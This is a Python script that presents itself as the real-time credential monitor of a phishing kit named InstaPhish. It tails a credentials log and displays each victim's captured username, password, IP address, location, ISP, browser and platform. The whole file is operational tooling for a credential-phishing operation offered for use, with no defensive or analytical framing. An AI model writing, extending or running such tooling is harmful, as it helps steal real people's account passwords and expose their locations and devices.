#!/usr/bin/env python3
"""
InstaPhish - Real-Time Credential Monitor
Author: r4tur1

Displays captured credentials in real-time with colored output.
Monitors the credentials log file and displays new entries.
"""

import os
import sys
import time
import signal
from datetime import datetime
from pathlib import Path

# Color codes
class Colors:
    GREEN = '\033[1;32m'
    CYAN = '\033[1;36m'
    YELLOW = '\033[1;33m'
    RED = '\033[1;31m'
    MAGENTA = '\033[1;35m'
    BLUE = '\033[1;34m'
    WHITE = '\033[1;37m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def clear_screen():
    """Clear terminal screen"""
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    """Display monitor banner"""
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════╗
║  {Colors.WHITE}InstaPhish - Real-Time Credential Monitor{Colors.RED}          ║
║  {Colors.DIM}Author: r4tur1 | github.com/r4tur1/InstaPhish{Colors.RED}      ║
╚══════════════════════════════════════════════════════╝{Colors.RESET}
{Colors.YELLOW}[!] Waiting for credentials...{Colors.RESET}
{Colors.DIM}──────────────────────────────────────────────────────────{Colors.RESET}
"""
    print(banner)

def tail_file(file_path):
    """Monitor file for new entries like tail -f"""
    try:
        with open(file_path, 'r') as f:
            # Go to end of file
            f.seek(0, 2)
            
            while True:
                line = f.readline()
                if line:
                    yield line
                else:
                    time.sleep(0.5)
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Log file not found. Waiting for creation...{Colors.RESET}")
        while not os.path.exists(file_path):
            time.sleep(1)
        return tail_file(file_path)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Monitor stopped.{Colors.RESET}")
        sys.exit(0)

def parse_and_display(line):
    """Parse log entry and display with colors"""
    line = line.strip()
    
    if not line:
        return
    
    if line.startswith('==='):
        print(f"{Colors.CYAN}{line}{Colors.RESET}")
    elif line.startswith('TIMESTAMP:'):
        timestamp = line.replace('TIMESTAMP:', '').strip()
        print(f"{Colors.YELLOW}⏰ Time: {timestamp}{Colors.RESET}")
    elif line.startswith('VERIFIED:'):
        verified = line.replace('VERIFIED:', '').strip()
        color = Colors.GREEN if verified == 'YES' else Colors.RED
        print(f"{color}✓ Verified: {verified}{Colors.RESET}")
    elif line.startswith('USERNAME:'):
        username = line.replace('USERNAME:', '').strip()
        print(f"{Colors.CYAN}👤 User: {Colors.BOLD}{username}{Colors.RESET}")
    elif line.startswith('PASSWORD:'):
        password = line.replace('PASSWORD:', '').strip()
        print(f"{Colors.MAGENTA}🔑 Pass: {Colors.BOLD}{password}{Colors.RESET}")
    elif line.startswith('IP:'):
        ip = line.replace('IP:', '').strip()
        print(f"{Colors.BLUE}🌐 IP: {ip}{Colors.RESET}")
    elif line.startswith('LOCATION:'):
        location = line.replace('LOCATION:', '').strip()
        print(f"{Colors.BLUE}📍 Location: {location}{Colors.RESET}")
    elif line.startswith('ISP:'):
        isp = line.replace('ISP:', '').strip()
        print(f"{Colors.DIM}🔌 ISP: {isp}{Colors.RESET}")
    elif line.startswith('BROWSER:'):
        browser = line.replace('BROWSER:', '').strip()
        if len(browser) > 80:
            browser = browser[:77] + '...'
        print(f"{Colors.DIM}🌍 Browser: {browser}{Colors.RESET}")
    elif line.startswith('PLATFORM:'):
        platform = line.replace('PLATFORM:', '').strip()
        print(f"{Colors.DIM}💻 Platform: {platform}{Colors.RESET}")

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print(f"\n{Colors.YELLOW}[!] Monitor stopped by user.{Colors.RESET}")
    sys.exit(0)

def main():
    """Main function"""
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    clear_screen()
    print_banner()
    
    # Determine log file path
    script_dir = Path(__file__).parent
    log_file = script_dir.parent / 'logs' / 'credentials.txt'
    
    # Alternative paths
    alt_paths = [
        log_file,
        Path('logs/credentials.txt'),
        Path('../logs/credentials.txt'),
        Path('credentials.txt')
    ]
    
    log_path = None
    for path in alt_paths:
        if path.exists():
            log_path = path
            break
    
    if not log_path:
        log_path = log_file
    
    # Start monitoring
    try:
        for line in tail_file(log_path):
            parse_and_display(line)
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
        sys.exit(1)

if __name__ == '__main__':
    main()